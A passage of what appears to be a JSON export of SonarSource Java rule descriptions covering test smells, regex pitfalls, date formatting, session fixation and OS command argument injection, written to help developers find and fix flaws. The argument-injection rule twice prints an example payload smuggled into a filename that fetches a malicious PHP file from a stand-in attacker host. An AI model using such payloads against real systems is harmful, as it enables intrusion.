that\nyou misunderstood the way you are supposed to use the mocking mechanism.</p>\n<p>You should either refactor the test code into multiple units, or consider using the class itself, by either directly instantiating it, or creating\na new one inheriting from it, with the expected behavior.</p>\n<p>This rule reports an issue when every member of a given class are mocked.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\nvoid test_requiring_MyClass() {\n  MyClass myClassMock = mock(MyClass.class); // Noncompliant\n  when(myClassMock.f()).thenReturn(1);\n  when(myClassMock.g()).thenReturn(2);\n  //...\n}\n\nabstract class MyClass {\n  abstract int f();\n  abstract int g();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Test\nvoid test_requiring_MyClass() {\n  MyClass myClass = new MyClassForTest();\n  //...\n}\n\nclass MyClassForTest extends MyClass {\n\n  @Override\n  int f() {\n    return 1;\n  }\n\n  @Override\n  int g() {\n    return 2;\n  }\n}\n</pre>\n<p>or</p>\n<pre>\n@Test\nvoid test_requiring_f() {\n  MyClass myClassMock = mock(MyClass.class);\n  when(myClassMock.f()).thenReturn(1);\n  //...\n}\n\n@Test\nvoid test_requiring_g() {\n  MyClass myClassMock = mock(MyClass.class);\n  when(myClassMock.g()).thenReturn(2);\n  //...\n}\n\nabstract class MyClass {\n  abstract int f();\n  abstract int g();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5969","summary":"Mocking all non-private methods of a class should be avoided","tags":["tests","mockito"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Annotating unit tests with more than one test-related annotation is not only useless but could also result in unexpected behavior like failing\ntests or unwanted side-effects.</p>\n<p>This rule reports an issue when a test method is annotated with more than one of the following competing annotation:</p>\n<ul>\n  <li> @Test </li>\n  <li> @RepeatedTest </li>\n  <li> @ParameterizedTest </li>\n  <li> @TestFactory </li>\n  <li> @TestTemplate </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\n@RepeatedTest(2) // Noncompliant, this test will be repeated 3 times\nvoid test() { }\n\n@ParameterizedTest\n@Test\n@MethodSource(\"methodSource\")\nvoid test2(int argument) { } // Noncompliant, this test will fail with ParameterResolutionException\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@RepeatedTest(2)\nvoid test() { }\n\n@ParameterizedTest\n@MethodSource(\"methodSource\")\nvoid test2(int argument) { }\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5967","summary":"Tests method should not be annotated with competing annotations","tags":["tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A common good practice is to write test methods targeting only one logical concept, that can only fail for one reason.</p>\n<p>While it might make sense to have more than one assertion to test one concept, having too many is a sign that a test became too complex and should\nbe refactored to multiples ones.</p>\n<p>This rule will report any test method containing more than a given number of assertion.</p>\n<h3>Noncompliant code example</h3>\n<p>With a parameter of 2.</p>\n<pre>\n@Test\nvoid test() { // Refactor this method.\n  assertEquals(1, f(1));\n  assertEquals(2, f(2));\n  assertEquals(3, g(1));\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nvoid test_f() {\n  assertEquals(1, f(1));\n  assertEquals(2, f(2));\n}\nvoid test_g() {\n  assertEquals(3, g(1));\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5961","summary":"Test methods should not contain too many assertions","tags":["tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Assertions are intended to be used in <strong>test</strong> code, but not in <strong>production</strong> code. It is confusing, and might lead to\n<code>ClassNotFoundException</code> when the build tools only provide the required dependency in test scope.</p>\n<p>In addition, assertions will throw a sub-class of <code>Error</code>: <code>AssertionError</code>, which should be avoided in production code.</p>\n<p>This rule raises an issue when any assertion intended to be used in test is used in production code.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit </li>\n  <li> FestAssert </li>\n  <li> AssertJ </li>\n</ul>\n<p>Note: this does not apply for <code>assert</code> from Java itself or if the source code package name is related to tests (contains:\n<code>test</code> or <code>assert</code> or <code>junit</code>).</p>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5960","summary":"Assertions should not be used in production code","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Unlike similar AssertJ methods testing exceptions (<code>assertThatCode()</code>, <code>assertThatExceptionOfType()</code>, â¦â), the\n<code>assertThatThrownBy()</code> method can be used alone, failing if the code did not raise any exception.</p>\n<p>Still, only testing that an exception was raised is not enough to guarantee that it was the expected one, and you should test the exception type or\ncontent further. In addition, it will make explicit what you are expecting, without relying on side-effects.</p>\n<p>This rule raises an issue when <code>assertThatThrownBy</code> is used, without testing the exception further.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nassertThatThrownBy(() -&gt; shouldThrow()); // Noncompliant, is it really the exception you expected?\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertThatThrownBy(() -&gt; shouldThrow()).isInstanceOf(IOException.class);\n//or\nassertThatThrownBy(() -&gt; shouldThrow()).hasMessage(\"My exception\");\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5958","summary":"AssertJ \"assertThatThrownBy\" should not be used alone","tags":["tests","assertj"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When creating a <code>DateTimeFormatter</code> using the <code>WeekFields.weekBasedYear()</code> temporal field, the resulting year number may be\noff by 1 at the beginning of a new year (when the date to format is in a week that is shared by two consecutive years).</p>\n<p>Using this year number in combination with an incompatible week temporal field yields a result that may be confused with the first week of the\nprevious year.</p>\n<p>Instead, when paired with a week temporal field, the week-based year should only be used with the week of week-based year temporal field\n<code>WeekFields.weekOfWeekBasedYear()</code>.</p>\n<p>Alternatively the temporal field <code>ChronoField.ALIGNED_WEEK_OF_YEAR</code> can be used together with a regular year (but not the week based\nyear).</p>\n<h3>Noncompliant code example</h3>\n<pre>\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR, 4) // Noncompliant: using week of week-based year with regular year\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR_OF_ERA, 4) // Noncompliant: using week of week-based year with regular year\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(WeekFields.ISO.weekBasedYear(), 4) // Noncompliant: using aligned week of year with week-based year\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n</pre>\n<p>Here the first two formatters would wrongly format the 1st of January 2016 as \"2016-53\" while the last one would format it as \"2015-01\"</p>\n<h3>Compliant solution</h3>\n<pre>\nnew DateTimeFormatterBuilder()\n      .appendValue(WeekFields.ISO.weekBasedYear(), 4)\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR, 4)\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR_OF_ERA, 4)\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n</pre>\n<p>Here the first formatter would format the 1st of January 2016 as \"2015-53\" while the last two would produce \"2016-01\", both of which are correct\ndepending on how you count the weeks.</p>\n<h3>Exceptions</h3>\n<p>No issue is raised when week-based year is not used in combination with a week temporal field.</p>\n<p>Similarly, no issue is raised if week of week-based year is not used in combination with a year temporal field.</p>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5917","summary":"DateTimeFormatters should not use mismatched year and week numbers","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data\nis limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the\nbehavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The\nsecurity of the application depends on the behavior of the application that is executed.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the\ncommand the parameters are added to, this might lead to arbitrary command execution.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organizationâs activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal serverâs data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Java Lang Package</h2>\n<h3>Code examples</h3>\n<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>\n<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or\nsanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected\nsystem command behavior.</p>\n<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the\nfollowing payload will download malicious software on the applicationâs hosting server.</p>\n<pre>\n -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/find\")\n    public void find(@RequestParam(\"filename\") String filename) throws IOException {\n\n        Runtime.getRuntime().exec(\"/usr/bin/find . -iname \" + filename);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/find\")\n    public void find(@RequestParam(\"filename\") String filename) throws IOException {\n\n        String cmd1[] = new String[] {\"/usr/bin/find\", \".\", \"-iname\", filename};\n        Process proc = Runtime.getRuntime().exec(cmd1); // Compliant\n    }\n}\n</pre>\n<p>java.lang.Runtime is sometimes used over java.lang.ProcessBuilder due to ease of use. Flexibility in methods often introduces security issues as\nedge cases are easily missed. The compliant solution logic is also applied to java.lang.ProcessBuilder.</p>\n<h3>How does this work?</h3>\n<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a languageâs native SDK.<br> Therefore, our suggestion is to avoid\nusing OS commands in the first place.</p>\n<p>Here <code>java.lang.Runtime.exec(String[] cmdarray)</code> takes care of escaping the passed arguments and internally creates a single string\ngiven to the operating system to be executed.</p>\n<h2>How to fix it in Apache Commons</h2>\n<h3>Code examples</h3>\n<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>\n<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or\nsanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected\nsystem command behavior.</p>\n<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the\nfollowing payload will download malicious software on the applicationâs hosting server.</p>\n<pre>\n -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/find\")\n    public void find(@RequestParam(\"filename\") String filename) throws IOException {\n\n        CommandLine cmd = new CommandLine(\"/usr/bin/find . -iname \" + filename);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/find\")\n    public void find(@RequestParam(\"filename\") String filename) throws IOException {\n\n        CommandLine cmd = new CommandLine(\"/usr/bin/find\");\n        cmd.addArguments(new String[] {\"/usr/bin/find\", \".\", \"-iname\", filename});\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a languageâs native SDK.<br> Therefore, our suggestion is to avoid\nusing OS commands in the first place.</p>\n<p>Here <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code> takes care of escaping the passed arguments and\ninternally creates a single string given to the operating system to be executed.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OS Command Injection Defense\n  Cheat Sheet</a> </li>\n  <li> GTFOBins - <a href=\"https://gtfobins.github.io/#+shell\">list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> LOLBAS - <a href=\"https://lolbas-project.github.io/#\">list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5883","summary":"OS commands should not be vulnerable to argument injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and\nimpersonate the userâs session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>\n<h2>Why is this an issue?</h2>\n<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Hereâs how a session fixation attack typically\nworks:</p>\n<ul>\n  <li> When a user visits a website or logs in, a session is created for them. </li>\n  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,\n  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>\n  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the\n  attacker. </li>\n  <li> At this point, the attacker can hijack and impersonate the victimâs session. </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain\nunauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>\n<h4>Impersonation</h4>\n<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid\ncredentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing\nmalicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldnât normally do, such as\nrevealing sensitive information or conducting financial transactions on the attackerâs behalf.</p>\n<h4>Data Breach</h4>\n<p>If an attacker gains access to a userâs session, they may also gain access to sensitive data associated with that session. This can include\npersonal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can\nbe used for identity theft, financial fraud, or other malicious purposes.</p>\n<h4>Privilege Escalation</h4>\n<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher\nprivileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized\nmodifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>In a Spring Securityâs context, session fixation protection is enabled by default but can be disabled with <code>sessionFixation().none()</code>\nmethod. Session fixation protection can also be enabled explicitly with <code>migrateSession()</code> but is superfluous in most cases.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n   http.sessionManagement()\n     .sessionFixation().none(); // Noncompliant: the existing session will continue\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n  http.sessionManagement()\n     .sessionFixation().migrateSession();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The protection works by ensuring that the session identifier, which is used to identify and track a userâs session, is changed or regenerated\nduring the authentication process.</p>\n<p>Hereâs how session fixation protection typically works:</p>\n<ol>\n  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored\n  in a cookie or passed through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows\n  the attacker to potentially gain unauthorized access to the userâs session. </li>\n  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a\n  user successfully authenticates, this mechanism generates a new session identifier for the userâs session. </li>\n  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the userâs session.\n  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>\n  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier\n  is typically stored in a new session cookie or passed through URL parameters. </li>\n</ol>\n<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the userâs session is tied to a new,\nsecure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the userâs\nsession and helps maintain the integrity and security of the applicationâs session management process.</p>\n<p>In Spring, calling <code>migrateSession()</code> explicitly is not necessary in most cases, as it automatically migrates session attributes to a\nnew session upon successful authentication. The <code>migrateSession()</code> method is typically explicitly used when you want to manually trigger\nthe migration of session attributes to a new session outside of the authentication process.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<p><a href=\"https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html\">Session Fixation Attack\nProtection</a></p>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Session_fixation\">OWASP Session Fixation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222579\">Application Security and\n  Development: V-222579</a> - Applications must use system-generated session identifiers that protect against session fixation. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222582\">Application Security and\n  Development: V-222582</a> - The application must not re-use or recycle session IDs. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5876","summary":"A new session should be created during user authentication","tags":["cwe","spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Character classes in regular expressions are a convenient way to match one of several possible characters by listing the allowed characters or\nranges of characters. If the same character is listed twice in the same character class or if the character class contains overlapping ranges, this\nhas no effect.</p>\n<p>Thus duplicate characters in a character class are either a simple oversight or a sign that a range in the character class matches more than is\nintended or that the author misunderstood how character classes work and wanted to match more than one character. A common example of the latter\nmistake is trying to use a range like <code>[0-99]</code> to match numbers of up to two digits, when in fact it is equivalent to <code>[0-9]</code>.\nAnother common cause is forgetting to escape the <code>-</code> character, creating an unintended range that overlaps with other characters in the\ncharacter class.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nstr.matches(\"[0-99]\") // Noncompliant, this won't actually match strings with two digits\nstr.matches(\"[0-9.-_]\") // Noncompliant, .-_ is a range that already contains 0-9 (as well as various other characters such as capital letters)\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nstr.matches(\"[0-9]{1,2}\")\nstr.matches(\"[0-9.\\\\-_]\")\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5869","summary":"Character classes in regular expressions should not contain the same character twice","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When placing Unicode <a href=\"https://unicode.org/glossary/#grapheme_cluster\">Grapheme Clusters</a> (characters which require to be encoded in\nmultiple <a href=\"https://unicode.org/glossary/#code_point\">Code Points</a>) inside a character class of a regular expression, this will likely lead\nto unintended behavior.</p>\n<p>For instance, the grapheme cluster <code>cÌ</code> requires two code points: one for <code>'c'</code>, followed by one for the <em>umlaut</em>\nmodifier <code>'\\u{0308}'</code>. If placed within a character class, such as <code>[cÌ]</code>, the regex will consider the character class being the\nenumeration <code>[c\\u{0308}]</code> instead. It will, therefore, match every <code>'c'</code> and every <em>umlaut</em> that isnât expressed as a\nsingle codepoint, which is extremely unlikely to be the intended behavior.</p>\n<p>This rule raises an issue every time Unicode Grapheme Clusters are used within a character class of a regular expression.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n\"ccÌdÌd\".replaceAll(\"[cÌdÌ]\", \"X\"); // Noncompliant, print \"XXXXXX\" instead of expected \"cXXd\".\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n\"ccÌdÌd\".replaceAll(\"cÌ|dÌ\", \"X\"); // print \"cXXd\"\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5868","summary":"Unicode Grapheme Clusters should be avoided inside regex character classes","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When using POSIX classes like <code>\\p{Alpha}</code> without the <code>UNICODE_CHARACTER_CLASS</code> flag or when using hard-coded character\nclasses like <code>\"[a-zA-Z]\"</code>, letters outside of the ASCII range, such as umlauts, accented letters or letter from non-Latin languages, wonât\nbe matched. This may cause code to incorrectly handle input containing such letters.</p>\n<p>To correctly handle non-ASCII input, it is recommended to use Unicode classes like <code>\\p{IsAlphabetic}</code>. When using POSIX classes, Unicode\nsupport should be enabled by either passing <code>Pattern.UNICODE_CHARACTER_CLASS</code> as a flag to <code>Pattern.compile</code> or by using\n<code>(?U)</code> inside the regex.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"[a-zA-Z]\");\nPattern.compile(\"\\\\p{Alpha}\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"\\\\p{IsAlphabetic}\"); // matches all letters from all languages\nPattern.compile(\"\\\\p{IsLatin}\"); // matches latin letters, including umlauts and other non-ASCII variations\nPattern.compile(\"\\\\p{Alpha}\", Pattern.UNICODE_CHARACTER_CLASS);\nPattern.compile(\"(?U)\\\\p{Alpha}\");\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5867","summary":"Unicode-aware versions of character classes should be preferred","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>By default case insensitivity only affects letters in the ASCII range. This can be changed by either passing <code>Pattern.UNICODE_CASE</code> or\n<code>Pattern.UNICODE_CHARACTER_CLASS</code> as an argument to <code>Pattern.compile</code> or using <code>(?u)</code> or <code>(?U)</code> within the\nregex.</p>\n<p>If not done, regular expressions involving non-ASCII letters will still handle those letters as being case sensitive.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"sÃ¶me pÃ¤ttern\", Pattern.CASE_INSENSITIVE);\nstr.matches(\"(?i)sÃ¶me pÃ¤ttern\");\nstr.matches(\"(?i:sÃ¶me) pÃ¤ttern\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"sÃ¶me pÃ¤ttern\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);\nstr.matches(\"(?iu)sÃ¶me pÃ¤ttern\");\nstr.matches(\"(?iu:sÃ¶me) pÃ¤ttern\");\n\n// UNICODE_CHARACTER_CLASS implies UNICODE_CASE\nPattern.compile(\"sÃ¶me pÃ¤ttern\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CHARACTER_CLASS);\nstr.matches(\"(?iU)sÃ¶me pÃ¤ttern\");\nstr.matches(\"(?iU:sÃ¶me) pÃ¤ttern\");\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5866","summary":"Case insensitive Unicode regular expressions should enable the \"UNICODE_CASE\" flag","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Assertions comparing an object to itself are more likely to be bugs due to developerâs carelessness.</p>\n<p>This rule raises an issue when the actual expression matches the expected expression.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nassertThat(actual).isEqualTo(actual); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertThat(actual).isEqualTo(expected);\n</pre>\n<h3>Exceptions</h3>\n<p>In a unit test validating the <code>equals(...)</code> and <code>hashCode()</code> methods, itâs legitimate to compare an object to itself. This\nrule does not raise an issue for <code>isEqualTo</code>, <code>assertEquals</code> or <code>hasSameHashCodeAs</code> when the unit test name contains\n(case insensitive): <code>equal</code>, <code>hash_?code</code>, <code>object_?method</code>. For example, in tests with the following names:\n<code>test_equals</code>, <code>testEqual</code>, <code>test_hashCode</code>, <code>test_hash_code</code>, <code>test_object_methods</code>.</p>\n<pre>\nclass 